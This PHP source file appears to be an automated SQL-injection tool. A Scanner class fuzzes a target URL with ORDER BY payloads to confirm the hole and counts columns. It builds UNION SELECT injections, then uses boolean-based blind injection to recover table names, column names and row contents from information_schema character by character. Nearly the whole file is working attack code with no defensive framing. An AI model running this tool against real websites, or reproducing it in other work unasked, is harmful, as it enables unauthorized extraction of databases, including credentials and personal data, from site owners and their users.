<?php

class Scanner
{
    public $site;
    public $sep; # separator

    public function __construct(TargetServer $site)
    {
        $this->site = $site;
        $this->sep = chr(31);
    }

    public function request($payload = "", $headerReq = 0)
    {
        $curl_arr = array();
        $master = curl_multi_init();
        $hds = [];
        $nodes = $this->site->url;
        if (!empty($payload)) {
            $nodes = array_map(function ($str) {
                return $this->site->url[0].$str."--+-";
            }, $payload); # add the url before each node.
        }
        foreach ($nodes as $id => $node) {
            $curl_arr[$id] = curl_init();
            curl_setopt($curl_arr[$id], CURLOPT_URL, $node);
            curl_setopt($curl_arr[$id], CURLOPT_HEADER, 0);
            curl_setopt($curl_arr[$id], CURLOPT_ENCODING, 'gzip,deflate');
            curl_setopt($curl_arr[$id], CURLOPT_RETURNTRANSFER, 1);
            curl_multi_add_handle($master, $curl_arr[$id]);
        }

        do {
            curl_multi_exec($master,$running);
            if($running>0){
                curl_multi_select($master,1);
            }
        } while($running > 0);
        foreach ($curl_arr as $id => $curl_obj) {
            if ($headerReq == 0) {
                $results[$id] = curl_multi_getcontent($curl_obj);
            } else {

                $results[$id] = curl_getinfo($curl_obj)['size_download'];
            }
            curl_multi_remove_handle($master, $curl_obj);
        }
        curl_multi_close($master);
        return $results;
    }
    
    public function check_vuln()
    { # boolean
        $trueHeader = $this->request("", 1);
        $this->site->set_tLength($trueHeader[0]);
        
        $orderQuery="+orDer+by+11111";
        $metaChr = array("","'",")","')",'"');
        $fullFuzz = array($metaChr[0].$orderQuery,$metaChr[1].$orderQuery,$metaChr[2].$orderQuery,$metaChr[3].$orderQuery,$metaChr[4].$orderQuery);
        $headers = $this->request($fullFuzz, 1);

        for ($i=0; $i<count($headers); $i++) {
            if ($headers[$i] != $trueHeader[0]) {
                $this->site->set_vulnStatus(true);
                break;
            }
        }
        return $this->site->isVuln;
    }

    public function create_injection($payload = "")
    { # union select 1,2,3...
        $sep = $this->sep;
        if (!isset($this->site->colsCount)) {
            $odd = range(1, 49, 2);
            $even = range(2, 50, 2);

            for ($i=0; $i<count($odd); $i++) {
                $linkOdd = "+OrDeR+bY+".$odd[$i];
                $linkEven = "+OrDeR+bY+".$even[$i];
                $headers = $this->request(array($linkOdd,$linkEven), 1);
                $oddH = $headers[0];
                $evenH = $headers[1];

                if ($headers[0] <= ($this->site->trueLen*0.9)) {
                    $colsCount = $odd[$i]-1;
                    break;
                } elseif ($headers[1] <= ($this->site->trueLen*0.9)) {
                    $colsCount = $even[$i]-1;
                    break;
                }
            }
            $this->site->set_colCount($colsCount); # save columns count so can rebuild the injection anytime any place in the project.
        }
        $colsSequence = range(1, $this->site->colsCount);
        # result: ie. 11111,22222,33333...
        array_walk($colsSequence, function (&$value) {
            $value = str_repeat($value, "5");
        });
        $colsSequence1 = implode(",0x1f),concat(0x1f,", $colsSequence);        
        $query = "+aNd+1=0+UnIOn+All+sElEcT+concat(0x1f,".$colsSequence1.",0x1f)";
        $exPage = $this->request(array($query));
        # Detect visible columns
        preg_match("/$sep([0-9]{5})$sep/i",$exPage[0],$matched);
        $this->site->set_visibleCol($matched[1]);
        $colsSequence = implode(",", $colsSequence);
        $colsSequence = preg_replace("/\b".$matched[1]."\b/", "concat(0x1f,".$matched[1].",0x1f)", $colsSequence);
        $query = "+aNd+1=0+UnIOn+All+sElEcT+".$colsSequence;
        return $query;
    }

    public function get_exploit($payload, $tablename = "", $condition = "", $schemas = false)
    {
        $sep1 = $this->sep;
        $sep2 = str_repeat($this->sep,2);
        //$sep3 = str_repeat($this->sep,3);
        $tablename == "" ? $from = "" : $from = "+from+".$tablename;
        $condition == "" ? $condition : $condition = "+where+table_schema=database()+and+".$condition;
        strpos($payload, ",") ? $payload = preg_replace("/,([^0-9])/", ",0x1f1f,\\1", $payload) : $payload;
        
        # create exploit command, ie. union select 1,2,3..
        $injection = $this->create_injection();
        
        if (!isset($this->site->visibleCol)) {
            $exPage = $this->request(array($injection));
            # select the returned numbers inside the page
            preg_match("/$sep1([0-9]{5})$sep1/i", $exPage[0], $matched);
            $this->site->set_visibleCol($matched[1]);
        }
        # replace exploit numbers with the payload
        $payload="concat(0x1f,".$payload.",0x1f)";
        $original="concat(0x1f,".$this->site->visibleCol.",0x1f)";
        $completeExploit = str_replace($original, $payload, $injection);
        
        if ($schemas) { # get schema records
            # parse the page for the our data
            $tblNo = 0;
            $colNo = 0;
            $exPage = [];
            $dataGems = [];
            do { # Utilize nested sql injection to move though each columns of each table until nothing left in the database!
            
                $tablesLoop = "+limit+$tblNo,1)";
                $colNo = 0;
                do {
                    $columnsLoop = "+limit+$colNo,1";
                    $looper = $completeExploit.$from.$condition.$tablesLoop.$columnsLoop;
                    $tempPage = $this->request(array($looper));
                    if (!strpos($tempPage[0], $sep2)) {
                        break;
                    }
                    preg_match("/$sep1([^>]*|[^<]*)$sep1/i", $tempPage[0], $matched);
                    $tblColCombo = explode($sep2, $matched[1]);

                    $dataGems[$tblColCombo[0]][$colNo] = $tblColCombo[1];
                    $colNo++;
                } while (strpos($tempPage[0], $sep1));
                $tblNo++;
            } while ($tblNo < $this->site->tblCount);

        } elseif ($this->site->rowsCount > 0) { # get one data record, such as database(),user(), count(table_name) ... etc
            $limit = "";
            $i = 0; 
            isset($this->site->rowsCount) ? $limit = "+limit+" : $limit;
            while ($i < $this->site->rowsCount) {
                $looper = $completeExploit.$from.$condition.$limit."$i,1";
                $exPage = $this->request(array($looper));
                preg_match("/$sep1([^>]*|[^<]*)$sep1/i", $exPage[0], $matched);
                #array('login' => 0: array('id' => 1, 'uname' => 'tariq' ) 1: ....)
                $record = explode($sep2,$matched[1]);
                if (count($this->site->tblSchemas[$tablename]) != count($record)) {
                    $short = count($this->site->tblSchemas[$tablename]) - count($record);
                    $array = array_fill(count($this->site->tblSchemas[$tablename]),$short,"");
                    $record = array_merge($record,$array);
                }
                $dataGems[$tablename][$i] = array_combine($this->site->tblSchemas[$tablename],$record);
                $i++;
            }
        }
        else { # get schemas such sa tabale_name, column_name, ...
            empty($from) ? $completeExploit : $completeExploit .= $from.$condition;
            $exPage = $this->request(array($completeExploit));
            preg_match("/$sep1([^>]*|[^<]*)$sep1/i", $exPage[0], $matched);
            $dataGems = $matched[1];
        }
        if (isset($dataGems) && !empty($dataGems)) {
            return $dataGems;
        }
        return false;
    }

    public function blind_fetch($blind_name="table_name")
    { # basePages: true and false pages
        $row_no=0;
        $tbl_len=0;
        /*         $false_tbl_len = "+and+mid((select+length($blind_name)+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,2)>111--+-"; // false table length
            $true_tbl_len = "+and+mid((select+length($blind_name)+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,2)>1--+-"; // false table length
            $baseline = $this->request(array($false_tbl_len, $true_tbl_len), 1);
                $false_page = $baseline[0]['content-length'][0];
                $this->site->trueLen = $baseline[1]['content-length'][0];
                if ($false_page == $this->site->trueLen) {
                    return false;
                } */
        do { # Get the total tables
            $q_tbl_count = "+and+mid((select+count($blind_name)+from+information_schema.tables+where+table_schema=database()),1,2)>$row_no--+-";
            $r_tbl_count = $this->request(array($q_tbl_count), 1);
            do { # get the length for each counted table
                $q_tbl_len = "+and+mid((select+length($blind_name)+from+information_schema.tables+where+table_schema=database()+limit+$row_no,1),1,2)>$tbl_len--+-";
                $r_tbl_len = $this->request(array($q_tbl_len), 1);
                $tbl_len++;
            } while ($r_tbl_len[0] == $this->site->trueLen); # loop until the number reached the total length
            $chr_no=1;
            while ($chr_no < $tbl_len) { # walk through each char in the table name
                for ($s_chr=97 ; $s_chr<123 ; $s_chr++) { # walk though alphabet and match with the selected char
                    $c_chr = $s_chr-32;
                    $sy_chr = $c_chr-32;
                    $b_query_small = "+and+mid((select+$blind_name+from+information_schema.tables+where+table_schema=database()+limit+$row_no,1),$chr_no,1)=char($s_chr)--+-";
                    $b_query_capital = "+and+mid((select+$blind_name+from+information_schema.tables+where+table_schema=database()+limit+$row_no,1),$chr_no,1)=char($c_chr)--+-";
                    $b_query_symbols = "+and+mid((select+$blind_name+from+information_schema.tables+where+table_schema=database()+limit+$row_no,1),$chr_no,1)=char($sy_chr)--+-";

                    $b_queries = $this->request(array($b_query_small,$b_query_capital,$b_query_symbols), 1);
                    if ($b_queries[0] != $this->site->trueLen && $b_queries[1] != $this->site->trueLen && $b_queries[2] != $this->site->trueLen) { # not matched, continue
                        continue;
                    } else { # matched, now let's see whether the char is small or capital
                        if ($b_queries[0] == $this->site->trueLen) {
                            $table_chars[$row_no][$chr_no] = $s_chr;
                        } elseif ($b_queries[1] == $this->site->trueLen) {
                            $table_chars[$row_no][$chr_no] = $c_chr;
                        } elseif ($b_queries[2] == $this->site->trueLen) {
                            $table_chars[$row_no][$chr_no] = $sy_chr;
                        }
                        break;
                    }
                }
                $chr_no++;
            }
            $row_no++;
        } while ($r_tbl_count[0] == $this->site->trueLen);

        foreach ($table_chars as $key => $table) {
            $table_chars[$key] = implode(array_map("chr", $table));
        }
        if ($blind_name == "table_name") {
            $tbl_rows = 0; # number of tables in the database;
    $row_no = 0; # number of rows in each table
    do { # loop until no more tables in the database
        do { # loop until no more columns in the table
            $tn = isset($table_chars[$tbl_rows]) ? $table_chars[$tbl_rows] : null;
            $q_col_count = "+and+mid((select+count(column_name)+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'),1,2)>$row_no--+-";
            $r_col_count = $this->request(array($q_col_count), 1);
            if ($r_col_count[0] != $this->site->trueLen) {
                break;
            }
            $col_len = 0; # length of column name;
            do { # get the length for each counted column
                $q_col_len = "+and+mid((select+length(column_name)+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'+limit+$row_no,1),1,2)>$col_len--+-";
                $r_col_len = $this->request(array($q_col_len), 1);
                $col_len++;
            } while ($r_col_len[0] == $this->site->trueLen);
            $chr_no = 1;
            while ($chr_no < $col_len) { # walk through each char in the column name
                for ($s_chr=97 ; $s_chr<123 ; $s_chr++) { # walk though alphabet and match with the selected char
                    $c_chr = $s_chr-32;
                    $b_query_small = "+and+mid((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'+limit+$row_no,1),$chr_no,1)=char($s_chr)--+-";
                    $b_query_capital = "+and+mid((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name='$tn'+limit+$row_no,1),$chr_no,1)=char($c_chr)--+-";
                    $b_queries = $this->request(array($b_query_small,$b_query_capital), 1);
                    if ($b_queries[0] != $this->site->trueLen && $b_queries[1] != $this->site->trueLen) { # not matched, continue
                        continue;
                    } else { # matched, now let's see whether the char is small or capital
                        if ($b_queries[0] == $this->site->trueLen) {
                            $cell_chars[$row_no][$chr_no] = $s_chr;
                        } elseif ($b_queries[1] == $this->site->trueLen) {
                            $cell_chars[$row_no][$chr_no] = $c_chr;
                        }
                        break;
                    }
                } # A char found
                $chr_no++;
            } # A column formulated
            $tableName = $table_chars[$tbl_rows];
            //$table_columns_chars["$tableName"][$row_no]=$cell_chars[$row_no];
            $table_columns_chars["$tableName"][$row_no] = isset($cell_chars[$row_no]) ? $cell_chars[$row_no] : null;
            unset($cell_chars);
            $row_no++;
        } while ($r_col_count[0] == $this->site->trueLen); # Found all columns
        //$cols_count[$tbl_rows] = $row_no; # get number of columns for each table, just to print it later for each tble accordingly
        $row_no = 0; # reset rows for the next table
        $tbl_rows++;
    } while ($tbl_rows < sizeof($table_chars));

            foreach ($table_columns_chars as $tbl => $columns) {
                foreach ($columns as $k => $cell) {
                    $table_columns_names[$tbl][$k] = implode(array_map("chr", $cell));
                }
            }
        } else {
            $table_columns_names = $table_chars[0];
        }
        return $table_columns_names;
    }

    public function get_records($tbl = "", $cols, $rows_no)
    { # basePages: true and false pages, getData: 1 to get records
        empty($tbl) ? $tbl : $tbl = "from".$tbl;
        $true_page = $this->site->trueLen;
        $separator = "0x".dechex(31);
        strpos($cols, ",") ? $cols = preg_replace("/,([^0-9])/", ",$separator,\\1", $cols) : $cols;
        $row_no=0;
        $col_len=0;
        while ($row_no < $rows_no) { # Get the total tables
        do { # get the length for each counted cell
            $q_col_len = "+and+mid((select+length(concat($cols))+$tbl+limit+$row_no,1),1,2)>$col_len--+-";
            $r_col_len = $this->request(array($q_col_len),1);
            $col_len++;
        } while ($r_col_len[0] == $true_page); # loop until the number reached the total length
            $chr_no=1; # reset to enumerate the next column.
            $col_len > 41 ? 41 : $col_len;
            while ($chr_no < $col_len) { # walk through each char in the cell name
                for ($s_chr=95 ; $s_chr<=126 ; $s_chr++) { # walk though alphabet and match with the selected char
                    $c_chr = $s_chr - 32;
                    $sy_chr = $c_chr - 32;
                    $sml_query = "+and+mid((select+concat($cols)+$tbl+limit+$row_no,1),$chr_no,1)=char($s_chr)";
                    $cap_query = "+and+mid((select+concat($cols)+$tbl+limit+$row_no,1),$chr_no,1)=char($c_chr)";
                    $sy_query = "+and+mid((select+concat($cols)+$tbl+limit+$row_no,1),$chr_no,1)=char($sy_chr)";
                    $response = $this->request(array($sml_query,$cap_query,$sy_query),1);
                    if ($response[0] != $true_page && $response[1] != $true_page && $response[2] != $true_page) { # not matched, continue
                        continue;
                    } else { # matched, now let's see whether the char is small or capital
                        if ($response[0] == $true_page) {
                            $cell_chars[$row_no][$chr_no] = $s_chr;
                        } elseif ($response[1] == $true_page) {
                            $cell_chars[$row_no][$chr_no] = $c_chr;
                        } elseif ($response[2] == $true_page) {
                            $cell_chars[$row_no][$chr_no] = $sy_chr;
                        }
                        break;
                    }
                }
                $chr_no++;
            }
            $row_no++;
        }
        foreach ($cell_chars as $key => $columns) {
            $cell_chars[$key] = implode(array_map("chr", $columns));
        }
        return $cell_chars;
    }
}

class TargetServer
{
    public $url;
    public $isVuln;
    public $trueLen;
    public $falseLen;
    public $dbinfo;
    public int $tblCount;
    public int $colsCount;
    public $visibleCol; # the column to exploit
    public $tblSchemas;
    public $rowsCount = 0;

    public function __construct($url)
    {
        $this->url = $url;
    }

    public function set_vulnStatus($isVuln)
    {
        $this->isVuln = $isVuln;
    }

    public function set_tLength($trueLen)
    {
        $this->trueLen = $trueLen;
    }

    public function set_fLength($falseLen)
    {
        $this->falseLen = $falseLen;
    }

    public function set_dbInfo($dbinfo)
    {
        $this->dbinfo = $dbinfo;
    }

    public function set_tblCount($tblCount)
    {
        $this->tblCount = $tblCount;
    }

    public function set_colCount($colsCount)
    {
        $this->colsCount = $colsCount;
    }

    public function set_visibleCol($visibleCol)
    {
        $this->visibleCol = $visibleCol;
    }

    public function set_tblSchemas($tblSchemas)
    {
//        foreach ($tblSchemas as $tKey => $tblSchema) {
            $this->tblSchemas = $tblSchemas;
  //      }
    }

    public function set_rowsCount($rowsCount) {
        isset($rowsCount) ? $this->rowsCount = $rowsCount : 1;
    }

    public function get_url()
    {
        $parsedUrl = parse_url($this->url[0]);

        #remove fragment (#...) from the url
        $scheme   = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] . '://' : '';
        $host     = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
        $port     = isset($parsedUrl['port']) ? ':' . $parsedUrl['port'] : '';
        $user     = isset($parsedUrl['user']) ? $parsedUrl['user'] : '';
        $pass     = isset($parsedUrl['pass']) ? ':' . $parsedUrl['pass']  : '';
        $pass     = ($user || $pass) ? "$pass@" : '';
        $path     = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
        $query    = isset($parsedUrl['query']) ? '?' . $parsedUrl['query'] : '';
        $fragment = isset($parsedUrl['fragment']) ? '#' . $parsedUrl['fragment'] : '';
        
        return $parsedUrl;
    }
}
